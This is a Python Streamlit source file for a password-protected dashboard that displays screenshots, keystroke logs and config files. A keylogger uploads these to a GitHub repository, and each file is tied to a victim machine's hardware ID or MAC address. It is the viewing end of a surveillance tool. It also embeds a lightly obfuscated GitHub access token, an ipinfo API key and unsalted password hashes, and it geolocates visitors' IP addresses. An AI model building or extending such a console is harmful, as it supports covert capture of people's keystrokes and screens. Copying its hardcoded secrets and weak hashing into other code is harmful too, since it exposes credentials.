import streamlit as st
import requests
from datetime import datetime, timedelta
import json
import hashlib
import time
from functools import lru_cache
from tenacity import retry, stop_after_attempt, wait_fixed
from streamlit import config as st_config
import os
import pandas as pd
import altair as alt
from ipinfo import getHandler
import base64


# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "delete" key exists
            if "delete" in token_data:
                token = token_data["delete"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                return processed_token
            else:
                print("Key 'delete' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()

# User credentials (you can replace this with a database later)
USER_CREDENTIALS = {
    "bibekin": {
        "password": "2a32d2e15cdfd451f3f4f9b42b230687eac70f9345ca9206529125bf10e58291",
        "unique_id": "1BBDF0EE-FCAA-EC11-9269-8CB87EED61E1"
    },
    "bibeknp": {
        "password": "188f7dd5422805bf7c499d7af7311a33dfa4e99411b276303655c935750745bf",
        "unique_id": "4C4C4544-0033-3910-804A-B3C04F324233"
    },
    "admin": {
        "password": "2269db840138864adb935fe4d1fc43cd8e4254e4c8071628522b2dd115c85907",
        "unique_id": "admin"
    },
    "devraj": {
        "password": "f2703f874cfd9fe5711bc7c01b38a60fcdddcd88ba98905fbb3f7d5fd4fc13b3",
        "unique_id": "FF:9B:C3:B8:53:25"
    }
}

# GitHub API details
GITHUB_API_URL_IMAGES = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots"
GITHUB_API_URL_LOGS = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/logs"
GITHUB_API_URL_CONFIG = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
GITHUB_API_URL_KEYLOGERROR = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/keylogerror"

# Function to fetch files from GitHub
@st.cache_data(ttl=60, show_spinner="Loading data from GitHub...")
@retry(stop=stop_after_attempt(3), wait=wait_fixed(1))
def fetch_files_from_github(api_url):
    try:
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            # Check rate limits
            remaining = int(response.headers.get("X-RateLimit-Remaining", 0))
            if remaining < 1000:
                st.warning(f"GitHub API rate limit low: {remaining} requests remaining")
            return response.json()
        else:
            st.error("Failed to fetch files from GitHub. Please check your API token.")
            return []
    except requests.exceptions.RequestException as e:
        st.error(f"Network error: {str(e)}")
        return []
    except json.JSONDecodeError:
        st.error("Invalid response from GitHub API")
        return []
    except KeyError:
        st.error("Unexpected data format from GitHub")
        return []

# Function to filter files for a specific user
def filter_files_for_user(files, unique_id):
    if files is None:  # Add null check
        return []
    filtered_files = [file for file in files if unique_id in file["name"]]
    return filtered_files

# Function to sort image files by timestamp
def sort_image_files_by_timestamp(files):
    # Filter only image files (assuming images have extensions like .png, .jpg, etc.)
    image_files = [file for file in files if file["name"].lower().endswith(('.png', '.jpg', '.jpeg'))]
    # Sort image files by timestamp extracted from the filename
    image_files.sort(key=lambda x: datetime.strptime(x["name"][:15], "%Y%m%d_%H%M%S"), reverse=True)
    return image_files

# Function to get file content from GitHub
# @st.cache_data  # Use @st.cache_data for caching
def get_file_content(file_url):
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    response = requests.get(file_url, headers=headers)
    if response.status_code == 200:
        return response.text
    else:
        st.error(f"Failed to fetch content for file: {file_url}")
        return ""

# Function to safely parse JSON content
def safe_parse_json(json_str):
    try:
        return json.loads(json_str)
    except json.JSONDecodeError as e:
        st.error(f"Failed to parse JSON content: {e}")
        return None

# Add new function
def log_user_activity(username, action):
    # """Log user activities to a file"""
    # timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # log_entry = f"{timestamp} - User: {username} - Action: {action}\n"
    """Enhanced logging with IP and user agent"""
    ip = requests.get('https://api.ipify.org').text
    user_agent = st.experimental_get_query_params().get('user_agent', ['Unknown'])[0]
    log_entry = f"{datetime.now()} | {ip} | {user_agent} | {username} | {action}\n"
    
    try:
        with open("user_activity.log", "a") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Failed to log activity: {e}")

# Add retry decorator to image loading
@retry(stop=stop_after_attempt(3), wait=wait_fixed(0.5))
def load_image_with_retry(url):
    response = requests.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"})
    response.raise_for_status()
    return response.content

# Update password hashing with salt
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# Streamlit app
def main():
#     st.set_page_config(page_title="User Dashboard", layout="wide", page_icon=":computer:")

    # Initialize session state
    if "logged_in" not in st.session_state:
        st.session_state.logged_in = False
        st.session_state.username = None
        st.session_state.unique_id = None
        st.session_state.files_images = None
        st.session_state.files_logs = None
        st.session_state.files_config = None
        st.session_state.files_keylogerror = None
        st.session_state.notifications = []
        _load_notifications()

    # Login Page
    if not st.session_state.logged_in:
        st_config.set_option("server.enableCORS", False)
        st_config.set_option("server.enableXsrfProtection", True)
        st.markdown("""<meta http-equiv="Content-Security-Policy" content="default-src 'self'">""", 
                  unsafe_allow_html=True)
        st.title("Login to your Dashboard")
        st.write("Please enter your credentials to access your dashboard.")
        st.subheader("Login")
        # Login form
        with st.form("login_form"):
            username = st.text_input("Username", max_chars=20).strip().lower()
            password = st.text_input("Password", type="password", max_chars=50).strip()
            if st.form_submit_button("Login"):
                if not username or not password:
                    st.error("Please fill in both fields")
                elif username in USER_CREDENTIALS:
                    input_hash = hashlib.sha256(password.encode()).hexdigest()
                    if input_hash == USER_CREDENTIALS[username]["password"]:
                        st.session_state.logged_in = True
                        st.session_state.username = username
                        st.session_state.unique_id = USER_CREDENTIALS[username]["unique_id"]
                        st.success("Login successful! Redirecting...")
                        log_user_activity(username, "Login")
                        st.success(f"Welcome, {username}!")
                        # Fetch files only once after login
                        st.session_state.files_images = fetch_files_from_github(GITHUB_API_URL_IMAGES)
                        st.session_state.files_logs = fetch_files_from_github(GITHUB_API_URL_LOGS)
                        st.session_state.files_config = fetch_files_from_github(GITHUB_API_URL_CONFIG)
                        st.session_state.files_keylogerror = fetch_files_from_github(GITHUB_API_URL_KEYLOGERROR)
                        # After successful login
                        create_notification(
                            f"New login from {requests.get('https://api.ipify.org').text}",
                            level="info",
                            recipient="admin"
                        )
                    else:
                        st.error("Invalid password")
                else:
                    st.error("Username not found")

    # Dashboard Page
    else:
        # st.toast("Processing your data...")
        st.warning("If you see your data not loading completely, Please consider clicking on **Refresh Data** button.")
        st.sidebar.warning("If you see your data not loading completely, Please consider clicking on **Refresh Data** button.")
        
        # Add notification bell to sidebar
        notification_bell()

        # Check for urgent notifications
        urgent = [n for n in st.session_state.notifications 
                 if n["level"] == "alert" and 
                 st.session_state.username not in n["read_by"] and 
                 (n["recipient"] == "all" or n["recipient"] == st.session_state.username)]

        if urgent:
            st.error("URGENT ALERTS - Please check notifications!")
            st.session_state.show_notifications = True
            st.rerun()
        
        # Add session timeout check at the top
        SESSION_TIMEOUT = 1800  # 30 minutes
        last_activity = st.session_state.get('last_activity', time.time())
        if time.time() - last_activity > SESSION_TIMEOUT:
            st.warning("Session timed out due to inactivity.")
            st.session_state.logged_in = False
            st.rerun()
        st.session_state.last_activity = time.time()
        st.title(f"Dashboard for {st.session_state.username}")
        st.sidebar.title(f"Dashboard for {st.session_state.username}")
        
        # Add refresh button in sidebar
        if st.sidebar.button("Refresh Data"):
            log_user_activity(st.session_state.username, "Data Refresh")
            st.cache_data.clear()
            st.session_state.files_images = fetch_files_from_github(GITHUB_API_URL_IMAGES)
            st.session_state.files_logs = fetch_files_from_github(GITHUB_API_URL_LOGS)
            st.session_state.files_config = fetch_files_from_github(GITHUB_API_URL_CONFIG)
            st.session_state.files_keylogerror = fetch_files_from_github(GITHUB_API_URL_KEYLOGERROR)
            st.rerun()
        
        # logout button
        # Keep only one logout button
        if st.sidebar.button("Logout", key="unique_logout_button"):
            log_user_activity(st.session_state.username, "Logout")
            st.session_state.logged_in = False
            st.session_state.username = None
            st.session_state.unique_id = None
            st.session_state.files_images = None
            st.session_state.files_logs = None
            st.session_state.files_config = None
            st.session_state.files_keylogerror = None
        
        # Filter files for the logged-in user
        filtered_files_images = filter_files_for_user(st.session_state.files_images, st.session_state.unique_id)
        filtered_files_logs = filter_files_for_user(st.session_state.files_logs, st.session_state.unique_id)
        filtered_files_config = filter_files_for_user(st.session_state.files_config, st.session_state.unique_id)
        filtered_files_keylogerror = filter_files_for_user(st.session_state.files_keylogerror, st.session_state.unique_id)


        # Images display code
        with st.spinner("Processing Images..."):
            # Display images in a grid layout
            if filtered_files_images:
                st.header("Recent Screenshots:")
                show_images = st.sidebar.checkbox("Hide Recent Screenshots")  # Changed to "Hide" for clearer meaning
                if not show_images:  # Show images when checkbox is unchecked
                    # Sort image files by timestamp
                    sorted_images = sort_image_files_by_timestamp(filtered_files_images)
                    # Input box for the number of images to display
                    num_images = st.sidebar.number_input("Number of Images to Display", min_value=1, max_value=len(sorted_images), value=20)
                    # Limit the images to the specified number
                    limited_images = sorted_images[:num_images]

                    if limited_images:
                        st.write(f"Displaying {len(limited_images)} Images:")
                        cols_per_row = 5  # Number of images per row
                        for i in range(0, len(limited_images), cols_per_row):
                            row_files = limited_images[i:i + cols_per_row]
                            cols = st.columns(cols_per_row)
                            for col, file in zip(cols, row_files):
                                with col:
                                    try:
                                        # Convert GitHub URL to raw content URL
                                        # raw_url = file["html_url"].replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
                                        raw_url = file["download_url"]
                                        # Fetch image content
                                        try:
                                            img_content = load_image_with_retry(raw_url)
                                            st.image(img_content, caption=file["name"], use_container_width=True)
                                            # Add GitHub link and download button
                                            # st.markdown(f"[Open in GitHub]({file['html_url']})")
                                            st.download_button(
                                                label="Download",
                                                data=img_content,
                                                file_name=file["name"],
                                                mime="image/png",
                                                on_click=lambda: st.toast(f"Downloading {file['name']}...")
                                            )
                                        except Exception as e:
                                            st.error(f"Failed to load image after 3 attempts: {file['name']}")
                                    except Exception as e:
                                        st.error(f"Error loading imagee {file['name']}: {str(e)}")
                                        st.image("placeholder.jpg")  # Add a default error image
            else:
                st.info("No images found for this user.")
        st.write("---")  # Separator between images

        # Logs display code
        with st.spinner("Processing Logs..."):
            # Display logs
            if filtered_files_logs:
                st.header("Logs:")
                for file in filtered_files_logs:
                    with st.expander(f"**{file['name']}**: Show File Content"):
                        file_content = get_file_content(file["download_url"])
                        if file["name"].endswith(".txt"):
                            st.text_area("File Content", file_content, height=300, disabled=True)
                        elif file["name"].endswith(".json"):
                            st.text_area("File Content", file_content, height=300, disabled=True)
                        st.markdown(f"[Open File]({file['html_url']})")
                        # Download button for logs
                        st.download_button(label="Download File", data=file_content, file_name=file["name"], mime="text/plain")

                # Add to log display section
                # with st.expander(f"**Search File Content**"):
                #     search_term = st.text_input("Search Logs")
                #     filtered_logs = st.text_area("Filtered Logs", value='\n'.join([log for log in file_content.split('\n') if search_term.lower() in log.lower()]))
                #     st.write('\n'.join(filtered_logs))
        st.write("---")  # Separator between logs

        # Config files display code
        with st.spinner("Processing Config Files..."):
            # Display config files
            if filtered_files_config:
                st.header("Config Files:")
            for file in filtered_files_config:
                with st.expander(f"**{file['name']}**: Show File Content"):
                    file_content = get_file_content(file["download_url"])
                    if file["name"].endswith(".json"):
                        st.text_area("File Content", file_content, height=300, disabled=True)
                    st.markdown(f"[Open File]({file['html_url']})")
                    # Download button for config files
                    st.download_button(label="Download File", data=file_content, file_name=file["name"], mime="application/json")
        st.write("---")  # Separator between config files
                
        # Keylogerror files display code
        with st.spinner("Processing Keylogerror Files..."):
            if filtered_files_keylogerror:
                st.header("Keylog Error Files:")
                for file in filtered_files_keylogerror:
                    with st.expander(f"**{file['name']}**: Show File Content"):
                        file_content = get_file_content(file["download_url"])
                        if file["name"].endswith(".log"):
                            st.text_area("File Content", file_content, height=300, disabled=True)
                        st.markdown(f"[Open File]({file['html_url']})")
                        # Download button for keylogerror files
                        st.download_button(label="Download File", data=file_content, file_name=file["name"], mime="text/plain")
        st.write("---")  # Separator between config files
        
        # Add admin section in sidebar
        if st.session_state.username == "admin":
            with st.expander("Send Notification"):
                message = st.text_area("Notification Message")
                recipient_type = st.selectbox("Recipient Type", ["all", "specific user", "multiple users"])  # Added new option
                recipient = "all"  # Default
                
                if recipient_type == "specific user":
                    recipient = st.selectbox("Select User", options=list(USER_CREDENTIALS.keys()))
                elif recipient_type == "multiple users":
                    recipient = st.multiselect("Select Users", options=list(USER_CREDENTIALS.keys()))
                
                level = st.selectbox("Severity", ["info", "warning", "alert"])
                expires = st.date_input("Expiration", datetime.now() + timedelta(days=7))
                
                if st.button("Send Notification"):
                    if recipient_type == "multiple users" and not recipient:
                        st.error("Please select at least one user")
                    else:
                        # Handle multiple recipients
                        recipients = recipient if recipient_type == "multiple users" else [recipient]
                        for user in recipients:
                            create_notification(
                                message,
                                level=level,
                                recipient=user,
                                expires=expires
                            )
                        st.success(f"Notification sent to {len(recipients)} users!")
            
            st.title("Admin Panel")
            st.subheader("User Activity Analysis")
            
            try:
                with open("user_activity.log", "r") as f:
                    logs = f.readlines()
                    st.download_button("Download Logs", "".join(logs), "activity.log")
                
            
                if logs:
                    activity_data = {
                        "timestamp": [log.split(' | ')[0] for log in logs],
                        "ip": [log.split(' | ')[1] for log in logs],
                        # "user_agent": [log.split(' | ')[2] for log in logs],
                        "user": [log.split(' | ')[3] for log in logs],
                        "action": [log.split(' | ')[4].strip() for log in logs]
                    }
                    
                    # Timeline and raw data
                    st.write("### Activity Timeline")
                    st.line_chart(pd.DataFrame(activity_data).set_index('timestamp'))
                    
                    # Activity Breakdown Charts
                    col1, col2 = st.columns(2)
                    with col1:
                        st.write("### User Activity Distribution")
                        user_counts = pd.DataFrame(pd.Series(activity_data["user"]).value_counts()).reset_index()
                        user_counts.columns = ['User', 'Count']
                        st.bar_chart(user_counts.set_index('User'))
                    with col2:
                        st.write("### Action Type Distribution")
                        action_counts = pd.DataFrame(pd.Series(activity_data["action"]).value_counts()).reset_index()
                        action_counts.columns = ['Action', 'Count']
                        st.bar_chart(action_counts.set_index('Action'))

                    # Add to the admin panel section after existing charts
                    st.write("### User-Action Relationship Heatmap")
                    try:
                        # Create a pivot table of user vs action counts
                        activity_df = pd.DataFrame(activity_data)
                        pivot_table = pd.pivot_table(activity_df, 
                                                    index='user', 
                                                    columns='action', 
                                                    aggfunc='size', 
                                                    fill_value=0)
                        
                        # Create heatmap using Altair
                        heatmap = alt.Chart(activity_df).mark_rect().encode(
                            x=alt.X('user:N', title="User"),
                            y=alt.Y('action:N', title="Action"),
                            color=alt.Color('count():Q', legend=alt.Legend(title="Count")),
                            tooltip=['user', 'action', 'count()']
                        ).properties(
                            width=600,
                            height=400
                        )
                        # st.altair_chart(heatmap)
                        st.altair_chart(heatmap, use_container_width=True)
                        
                    except Exception as e:
                        st.error(f"Could not generate heatmap: {str(e)}")
                    
                    
                    # Raw data table
                    st.write("### Raw Activity Data")
                    st.dataframe(pd.DataFrame(activity_data), height=300, use_container_width=True, hide_index=True)
                    
                    # Add recent activity
                    st.write("### Recent Activity")
                    st.text_area("Recent Activity", "".join(logs[-2000:]), disabled=True, height=300)
                    
                    # Add to admin panel
                    st.subheader("User Locations")
                    locations = []
                    handler = getHandler('ccb3ba52662beb')  # Get free token at ipinfo.io
                    for ip in set(activity_data["ip"]):
                        try:
                            details = handler.getDetails(ip)
                            if details.latitude and details.longitude:
                                locations.append((
                                    float(details.latitude), 
                                    float(details.longitude)
                                ))
                        except Exception as e:
                            print(f"Error processing IP {ip}: {str(e)}")
                            continue

                    if locations:
                        try:
                            # Convert to DataFrame with proper numeric types
                            df = pd.DataFrame(locations, columns=['lat', 'lon'])
                            df['lat'] = pd.to_numeric(df['lat'], errors='coerce')
                            df['lon'] = pd.to_numeric(df['lon'], errors='coerce')
                            df = df.dropna()
                            
                            if not df.empty:
                                st.map(df)
                            else:
                                st.warning("No valid location data available")
                        except Exception as e:
                            st.error(f"Error displaying map: {str(e)}")
                    else:
                        st.warning("No location data available")
                    
                else:
                    st.warning("No activity data available")
            except FileNotFoundError:
                st.warning("No activity log found")
        
        st.sidebar.markdown("---")  # Add a separator
        # Add explanation tooltips throughout the UI
        with st.sidebar:
            st.markdown("ℹ️ **Help**")
            st.caption("Use the **Refresh Data** if data appears outdated")
        
        with st.sidebar.expander("What are these screenshots?"):
            st.write("These are automated screenshots captured in user defined interval...")
        
        with st.sidebar.expander("What are these logs?"):
            st.write("These are automated key logs captured in user defined interval...")
            
        with st.sidebar.expander("What are these config files?"):
            st.write("These are automated program configuration captured in user defined interval...")
            
        with st.sidebar.expander("What are these keylogerror files?"):
            st.write("These are automated keylogerror captured in user defined interval...")
            
        st.sidebar.markdown("---")  # Add a separator
        st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")

        

# Add notification functions
def create_notification(message, level="info", recipient="all", expires=None):
    """Create a new notification"""
    notification = {
        "timestamp": datetime.now(),
        "message": message,
        "level": level,
        "recipient": recipient,
        "read_by": [],  # Track which users have read it
        "expires": expires or datetime.now() + timedelta(days=7)
    }
    st.session_state.notifications.append(notification)
    _save_notifications()

def _save_notifications():
    """Save notifications to GitHub"""
    try:
        # Add indentation for pretty-printing
        content = json.dumps(st.session_state.notifications, 
                            indent=2, 
                            default=str, 
                            sort_keys=True)
        
        url = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/notifications.json"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Get existing file SHA
        response = requests.get(url, headers=headers)
        sha = response.json().get("sha") if response.status_code == 200 else None
        
        # Prepare data with branch specification
        data = {
            "message": "Update notifications",
            "content": base64.b64encode(content.encode()).decode(),  # Correct encoding
            "sha": sha,
            "branch": "main"  # Explicitly specify branch
        }
        
        response = requests.put(url, headers=headers, json=data)
        response.raise_for_status()  # Raise error for non-200 status
        
    except Exception as e:
        st.error(f"Failed to save notifications: {str(e)}")
        print(f"Full error: {e}\nResponse: {response.text if 'response' in locals() else ''}")

# Update the notification_bell function
def notification_bell():
    with st.sidebar:
        # Refresh notifications when bell is clicked
        _load_notifications()
        
        # Count unread for current user
        unread = sum(1 for n in st.session_state.notifications 
        #           if not n["read"] and (n["recipient"] == "all" or n["recipient"] == st.session_state.username))
        # if st.button(f"🔔 ({unread})", key="notif_bell", help="View notifications"):
        #     st.session_state.show_notifications = True
        #     st.rerun()
                    if st.session_state.username not in n["read_by"] and 
                    (n["recipient"] == "all" or n["recipient"] == st.session_state.username) and 
                    datetime.now() < n["expires"])
        
        if st.button(f"🔔 ({unread})", key="notif_bell", help="View notifications"):
            st.session_state.show_notifications = True
            st.rerun()
        
        # col1, col2 = st.columns([1, 3])
        # with col1:
        #     # st.markdown("🔔")
        #     st.write(f"🔔 ({unread})")
            
        # with col2:
        #     btn_text = f" ({unread})" if unread > 0 else ""
        #     if st.button(f"Notifications{btn_text}", key="notif_bell"):
        #         st.session_state.show_notifications = True
        #         st.rerun()

        if st.session_state.get("show_notifications"):
            with st.popover("Notifications", use_container_width=True):
                st.markdown("### Notifications")
                valid_notifications = []
                
                for idx, notification in enumerate(st.session_state.notifications):
                    # Convert string timestamps to datetime objects
                    if isinstance(notification["timestamp"], str):
                        notification["timestamp"] = datetime.fromisoformat(notification["timestamp"])
                    if isinstance(notification["expires"], str):
                        notification["expires"] = datetime.fromisoformat(notification["expires"])
                    
                    if (notification["recipient"] in ["all", st.session_state.username] and 
                        datetime.now() < notification["expires"]):
                        valid_notifications.append((idx, notification))
                
                if valid_notifications:
                    for idx, notification in valid_notifications:
                        col1, col2 = st.columns([1, 20])
                        with col1:
                            st.write({"info": "ℹ️", "warning": "⚠️", "alert": "🚨"}[notification["level"]])
                        with col2:
                            status = "✅" if st.session_state.username in notification["read_by"] else "✉️"
                            st.write(f"{status} {notification['timestamp']}: {notification['message']}")
                            if st.button("Dismiss", key=f"dismiss_{idx}"):
                                if st.session_state.username not in notification["read_by"]:
                                    notification["read_by"].append(st.session_state.username)
                                    _save_notifications()
                                    st.rerun()
                else:
                    st.write("No new notifications")
                
                st.button("Clear All", on_click=lambda: [
                    n["read_by"].append(st.session_state.username) for n in st.session_state.notifications
                    if st.session_state.username not in n["read_by"]
                ])

# Add this to the notification functions section
def _load_notifications():
    """Load notifications from GitHub"""
    try:
        url = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/notifications.json"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3.raw"  # Get raw content directly
        }
        
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            content = response.text  # Directly get decoded content
            st.session_state.notifications = json.loads(content)
            
            # Convert string dates to datetime objects
            for notification in st.session_state.notifications:
                # Handle timestamp
                if isinstance(notification["timestamp"], str):
                    notification["timestamp"] = datetime.fromisoformat(notification["timestamp"])
                
                # Handle expiration date
                if isinstance(notification["expires"], str):
                    notification["expires"] = datetime.fromisoformat(notification["expires"])
            
            # Migrate old notifications
            for n in st.session_state.notifications:
                if "read_by" not in n:
                    n["read_by"] = [n["recipient"]] if n.get("read", False) else []
                    if "read" in n:
                        del n["read"]
            _save_notifications()
        
    except Exception as e:
        print(f"Error loading notifications: {str(e)}")

# Run the app
if __name__ == "__main__":
    st.set_page_config(page_title="User Dashboard", layout="wide", page_icon=":computer:")
    with st.spinner("Loading dashboard..."):
        # Add at the top
        # headers = {
        #     "Content-Security-Policy": "default-src 'self'",
        #     "X-Content-Type-Options": "nosniff",
        #     "X-Frame-Options": "DENY"
        # }
        # st.experimental_set_query_params(headers=headers)
        main()

# Custom footer
import datetime
current_year = datetime.datetime.now().year
st.markdown(f"""
    <footer style='text-align: center;'>
        © {current_year} Active User Dashboard | Developed by <a href='https://bibekchandsah.com.np' target='_blank' style='text-decoration: none; color: inherit;'>Bibek Chand Sah</a>
    </footer>
""", unsafe_allow_html=True)